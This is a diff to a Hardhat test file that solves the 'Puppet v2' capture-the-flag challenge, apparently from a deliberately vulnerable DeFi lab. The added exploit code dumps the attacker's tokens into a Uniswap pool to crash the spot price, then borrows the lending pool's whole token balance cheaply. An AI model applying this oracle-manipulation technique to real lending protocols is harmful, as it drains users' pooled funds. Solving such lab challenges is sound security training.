@@ -4,6 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { parseEther } = require("ethers/lib/utils");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
@@ -82,6 +83,26 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const p = [];
+        p[0] = this.token.address;
+        p[1] = this.weth.address;
+        
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            10000,
+            p,
+            attacker.address,
+            (await ethers.provider.getBlock("latest")).timestamp * 2,
+            { gasLimit: 1e6 }
+        );
+
+        const bal = (await ethers.provider.getBalance(attacker.address)).sub(parseEther("0.1"));
+
+        await this.weth.connect(attacker).deposit({ value: bal });
+        await this.weth.connect(attacker).approve(this.lendingPool.address, bal);
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
